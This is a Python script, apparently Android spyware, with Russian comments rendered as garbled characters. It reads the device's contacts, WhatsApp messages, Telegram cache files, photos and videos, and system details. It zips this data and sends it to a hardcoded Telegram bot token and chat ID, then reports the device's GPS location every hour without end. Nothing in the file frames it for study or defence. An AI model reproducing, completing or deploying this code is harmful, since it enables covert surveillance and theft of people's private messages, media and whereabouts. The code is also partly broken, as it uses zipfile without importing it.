import os
import time
import json
import sqlite3
import requests
import logging
import subprocess
import shutil
import base64
from datetime import datetime
import re

# ===== –ù–ê–°–¢–†–û–ô–ö–ò =====
TELEGRAM_BOT_TOKEN = "7961419672:AAEd-VMzuf43W9PsaQLveQ__vYMf2EOswu0"
TELEGRAM_CHAT_ID = "5024505351"
TEMP_DIR = "/data/local/tmp/full_system_report"
MAX_FILES_TO_SEND = 10  # –õ–∏–º–∏—Ç —Ñ–∞–π–ª–æ–≤ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–æ–≤
logging.basicConfig(
    filename="/data/local/tmp/system_collector.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

class AndroidDataCollector:
    def __init__(self):
        self.init_time = datetime.now().isoformat()
        os.makedirs(TEMP_DIR, exist_ok=True)
        self.collected_data = {
            "system": {},
            "contacts": [],
            "media": [],
            "messages": {"telegram": [], "whatsapp": []},
            "location_history": [],
            "credentials": {},
            "software": [],
            "wifi": [],
            "cmd_history": []
        }
        self.session_id = os.urandom(16).hex()

    def log_to_telegram(self, message):
        """–õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–±—ã—Ç–∏–π —Å —É–Ω–∏–∫–∞–ª—å–Ω—ã–º ID —Å–µ—Å—Å–∏–∏"""
        try:
            log_message = f"[{self.session_id[:8]}] {message}"
            url = f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage"
            data = {"chat_id": TELEGRAM_CHAT_ID, "text": log_message, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=30)
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–∞ –≤ Telegram: {e}")

    def send_file_to_telegram(self, file_path, caption=""):
        """–û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–∞–π–ª–∞ –≤ Telegram"""
        try:
            url = f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendDocument"
            with open(file_path, "rb") as f:
                files = {"document": f}
                data = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption, "parse_mode": "HTML"}
                requests.post(url, data=data, files=files, timeout=30)
        except Exception as e:
            self.log_to_telegram(f"‚ùå <b>–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–∞ {file_path}:</b> {e}")

    def collect_contacts(self):
        """–°–±–æ—Ä –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ –∏–∑ SQLite –±–∞–∑—ã Android"""
        self.log_to_telegram("üì± <b>–°–±–æ—Ä –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤...</b>")
        contacts_db = "/data/data/com.android.providers.contacts/databases/contacts2.db"
        if not os.path.exists(contacts_db):
            self.log_to_telegram("‚ùå <b>–ë–∞–∑–∞ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞</b>")
            return
        try:
            conn = sqlite3.connect(contacts_db)
            cursor = conn.cursor()
            cursor.execute("SELECT display_name, data1 FROM data WHERE mimetype_id=5")
            contacts = cursor.fetchall()
            for name, number in contacts:
                self.collected_data["contacts"].append({"name": name, "number": number})
            self.log_to_telegram(f"‚úÖ <b>–ù–∞–π–¥–µ–Ω–æ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤:</b> {len(contacts)}")
        except Exception as e:
            self.log_to_telegram(f"‚ùå <b>–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤:</b> {e}")

    def collect_media(self):
        """–°–±–æ—Ä —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–π –∏ –≤–∏–¥–µ–æ —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞"""
        self.log_to_telegram("üì∑ <b>–°–∫–∞–Ω–∏—Ä—É–µ–º –º–µ–¥–∏–∞...</b>")
        media_paths = [
            "/sdcard/Pictures/",
            "/sdcard/DCIM/",
            "/sdcard/Movies/"
        ]
        for path in media_paths:
            if not os.path.exists(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower().endswith((".jpg", ".png", ".mp4")):
                        file_path = os.path.join(root, file)
                        self.collected_data["media"].append(file_path)
                        if len(self.collected_data["media"]) >= MAX_FILES_TO_SEND:
                            break
        self.log_to_telegram(f"‚úÖ <b>–ù–∞–π–¥–µ–Ω–æ –º–µ–¥–∏–∞:</b> {len(self.collected_data['media'])}")
        for file in self.collected_data["media"][:5]:
            self.send_file_to_telegram(file, f"üñºÔ∏è <b>–ú–µ–¥–∏–∞:</b> {os.path.basename(file)}")

    def collect_messages_telegram(self):
        """–ü–∞—Ä—Å–∏–Ω–≥ —Å–æ–æ–±—â–µ–Ω–∏–π Telegram"""
        self.log_to_telegram("üí¨ <b>–°–±–æ—Ä —Å–æ–æ–±—â–µ–Ω–∏–π Telegram...</b>")
        tg_cache_dir = "/data/data/org.telegram.messenger/files/cache/"
        if not os.path.exists(tg_cache_dir):
            self.log_to_telegram("‚ö†Ô∏è <b>Telegram –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω</b>")
            return
        for root, _, files in os.walk(tg_cache_dir):
            for file in files:
                if file.endswith(".json"):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "r", encoding="utf-8") as f:
                            content = f.read()
                            self.collected_data["messages"]["telegram"].append({
                                "file": file_path,
                                "sample": content[:100]
                            })
                    except:
                        continue
        self.log_to_telegram(f"‚úÖ <b>Telegram —Å–æ–æ–±—â–µ–Ω–∏–π:</b> {len(self.collected_data['messages']['telegram'])}")

    def collect_messages_whatsapp(self):
        """–ü–∞—Ä—Å–∏–Ω–≥ —Å–æ–æ–±—â–µ–Ω–∏–π WhatsApp"""
        self.log_to_telegram("üí¨ <b>–°–±–æ—Ä —Å–æ–æ–±—â–µ–Ω–∏–π WhatsApp...</b>")
        wa_db = "/data/data/com.whatsapp/files/msgstore.db"
        if not os.path.exists(wa_db):
            self.log_to_telegram("‚ö†Ô∏è <b>WhatsApp –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω</b>")
            return
        try:
            conn = sqlite3.connect(wa_db)
            cursor = conn.cursor()
            cursor.execute("SELECT key_remote_jid, data FROM messages ORDER BY timestamp DESC LIMIT 50")
            messages = cursor.fetchall()
            for jid, msg in messages:
                self.collected_data["messages"]["whatsapp"].append({
                    "jid": jid,
                    "message": msg
                })
            self.log_to_telegram(f"‚úÖ <b>WhatsApp —Å–æ–æ–±—â–µ–Ω–∏–π:</b> {len(messages)}")
        except Exception as e:
            self.log_to_telegram(f"‚ùå <b>–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è WhatsApp:</b> {e}")

    def track_location(self):
        """–û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è –∫–∞–∂–¥—ã–µ 60 –º–∏–Ω—É—Ç"""
        self.log_to_telegram("üìç <b>–ó–∞–ø—É—Å–∫ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è</b>")
        while True:
            try:
                result = subprocess.check_output(["dumpsys", "location"]).decode()
                lat_match = re.search(r"lat=(\d+\.\d+)", result)
                lon_match = re.search(r"lon=(-?\d+\.\d+)", result)
                if lat_match and lon_match:
                    lat = lat_match.group(1)
                    lon = lon_match.group(1)
                    self.collected_data["location_history"].append({
                        "timestamp": datetime.now().isoformat(),
                        "latitude": lat,
                        "longitude": lon
                    })
                    self.log_to_telegram(f"üß≠ <b>–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:</b> {lat}, {lon}")
            except Exception as e:
                self.log_to_telegram(f"‚ùå <b>–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç:</b> {e}")
            time.sleep(3600)  # –ö–∞–∂–¥—ã–π —á–∞—Å

    def collect_system_info(self):
        """–°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ"""
        self.log_to_telegram("üîç <b>–°–±–æ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏...</b>")
        try:
            brand = subprocess.check_output(["getprop", "ro.product.brand"]).decode().strip()
            model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
            android_version = subprocess.check_output(["getprop", "ro.build.version.release"]).decode().strip()
            ip = subprocess.check_output(["ifconfig", "wlan0"]).decode().split("inet addr:")[1].split()[0]
            self.collected_data["system"] = {
                "brand": brand,
                "model": model,
                "android_version": android_version,
                "ip": ip,
                "session_id": self.session_id,
                "init_time": self.init_time
            }
            self.log_to_telegram(f"‚úÖ <b>–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:</b> {brand} {model} ({android_version})")
        except Exception as e:
            self.log_to_telegram(f"‚ùå <b>–û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö:</b> {e}")

    def create_report(self):
        """–°–æ–∑–¥–∞–Ω–∏–µ –∞—Ä—Ö–∏–≤–∞ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞"""
        self.log_to_telegram("üì¶ <b>–°–æ–∑–¥–∞–Ω–∏–µ –æ—Ç—á—ë—Ç–∞...</b>")
        zip_path = os.path.join(TEMP_DIR, "report.zip")
        with zipfile.ZipFile(zip_path, "w") as zipf:
            meta_path = os.path.join(TEMP_DIR, "meta.json")
            with open(meta_path, "w") as f:
                json.dump(self.collected_data, f, indent=2)
            zipf.write(meta_path, "meta.json")
            for file in self.collected_data["media"]:
                if os.path.exists(file):
                    zipf.write(file, os.path.basename(file))
        self.send_file_to_telegram(zip_path, "üìÅ <b>–û—Ç—á—ë—Ç</b>")
        self.log_to_telegram("‚úÖ <b>–û—Ç—á—ë—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω</b>")

    def run(self):
        """–û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª"""
        self.collect_system_info()
        self.collect_contacts()
        self.collect_media()
        self.collect_messages_telegram()
        self.collect_messages_whatsapp()
        self.create_report()
        self.track_location()

if __name__ == "__main__":
    collector = AndroidDataCollector()
    collector.run()
